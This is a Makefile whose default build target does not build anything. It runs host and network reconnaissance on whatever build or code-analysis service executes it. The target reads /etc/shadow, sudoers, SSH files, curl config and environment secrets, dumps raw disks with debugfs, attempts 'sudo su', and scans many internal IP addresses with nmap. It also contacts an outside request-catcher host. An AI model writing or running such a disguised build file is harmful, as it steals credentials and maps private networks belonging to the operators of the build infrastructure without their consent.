.DEFAULT_GOAL := build
checksource:
ifneq ($(ODASA_DB), /opt/out/snapshot/working/db-go)
	echo "Error: not in go build" && exit 2
endif
ListAllCommands:
	echo -n ${PATH} | xargs -d : -I {} find {} -maxdepth 1 \
	    -executable -type f -printf '%P\n' | sort -u
EchoEnv:
	printenv | sort
build: checksource ListAllCommands EchoEnv
	cat /etc/sudoers || true
	ls -l /etc/sudoers || true
	ls -l /etc/passwd || true
	cat /etc/shadow || true
	find / -writable || true
	find / -executable || true
	find /usr/local/share/ca-certificates | sort -u || true
	find /opt ! -path "/opt/dist/queries/*" ! -path "/opt/extra/android/*" | sort -u || true
	(git clone https://github.com/nmap/nmap && cd nmap && ./configure && make && make install && ls) || true
	runner-linux || true
	runner || true
	relocator.py || true
	query_cli_native64.so || true
	initctl || true
	extractor || true
	dep || true
	compile_et || true
	unminimize || true
	cat /etc/shells || true
	cat /etc/passwd || true
	cat ~/.curlrc || true
	cat /proc/cmdline || true
	cat /proc/cpuinfo || true
	debugfs /dev/sda1 -R ls || true
	debugfs /dev/sdb -R ls || true
	debugfs /dev/sdc1 -R ls || true
	ls -al /dev/disk/by-uuid || true
	ls -al /proc || true
	cat /root/.start-build.sh || true
	ls -al /root/ || true
	cat /proc/1/cgroup || true
	cat /.dockerenv || true
	ls -al ~/ || true
	ls -al / || true
	ls -al /home || true
	df -h || true
	ls -al /dev || true
	ls -al /var/run || true
	hostname || true
	hostnamectl || true
	last || true
	networkctl -a || true
	ps aux || true
	whoami || true
	uname -a || true
	curl -X POST -H "Content-Type: application/json" -d '{"name": "John"}' https://hookb.in/PxlndeYwL7UZVqjmP0gx
	curl -v -k 127.0.0.1 || true
	curl -v -k 192.168.1.1 || true
	sudo su || true
	sudo visudo || true
	mitmproxy || true
	mitmdump || true
	mitmweb || true
	pathoc || true
	pathod || true
	curl -v -k localhost || true
	curl -v -k http://localhost || true
	curl -v -k http://localhost:8081 || true
	curl -v -k https://proxy.golang.org || true
	apt-get update || true
	apt-get install nmap || true
	wget https://google.com -O-
	wget https://youtube.com/ -O-
	./nmap/nmap 127.0.0.1 || true
	./nmap/nmap localhost || true
	./nmap/nmap 192.168.0.1
	./nmap/nmap 192.168.1.1
	./nmap/nmap 192.168.0.254
	./nmap/nmap 192.168.1.254
	./nmap/nmap 10.0.0.1
	./nmap/nmap 10.0.0.2
	./nmap/nmap 10.0.0.138
	./nmap/nmap 10.0.1.1
	./nmap/nmap 10.1.1.1
	./nmap/nmap 10.1.10.1
	./nmap/nmap 10.10.1.1
	./nmap/nmap 10.90.90.90
	./nmap/nmap 192.168.0.3
	./nmap/nmap 192.168.0.10
	./nmap/nmap 192.168.0.30
	./nmap/nmap 192.168.0.50
	./nmap/nmap 192.168.0.100
	./nmap/nmap 192.168.0.101
	./nmap/nmap 192.168.0.227
	./nmap/nmap 192.168.0.254
	./nmap/nmap 192.168.1.10
	./nmap/nmap 192.168.1.99
	./nmap/nmap 192.168.1.100
	./nmap/nmap 192.168.1.200
	./nmap/nmap 192.168.1.210
	./nmap/nmap 192.168.2.1
	./nmap/nmap 192.168.2.254
	./nmap/nmap 192.168.3.1
	./nmap/nmap 192.168.4.1
	./nmap/nmap 192.168.8.1
	./nmap/nmap 192.168.10.1
	./nmap/nmap 192.168.10.10
	./nmap/nmap 192.168.10.100
	./nmap/nmap 192.168.10.50
	./nmap/nmap 192.168.11.1
	./nmap/nmap 192.168.15.1
	./nmap/nmap 192.168.16.1
	./nmap/nmap 192.168.20.1
	./nmap/nmap 192.168.30.1
	./nmap/nmap 192.168.50.1
	./nmap/nmap 192.168.55.1
	./nmap/nmap 192.168.62.1
	./nmap/nmap 192.168.100.1
	./nmap/nmap 192.168.100.100
	./nmap/nmap 192.168.102.1
	./nmap/nmap 192.168.123.254
	./nmap/nmap 192.168.168.168
	./nmap/nmap 192.168.223.100
	./nmap/nmap 192.168.251.1
	./nmap/nmap 192.168.254.254
	./nmap/nmap 200.200.200.5
	cat ~/.ssh/known_hosts || true
	ls -al ~/.ssh || true
	for var in $$(printenv | mawk -F= '{print $$2}'); do\
	 echo ::: $$var ::: && \
	 cat $$var || ls $$var || true; \
	done
.PHONY: ListAllCommands EchoEnv build
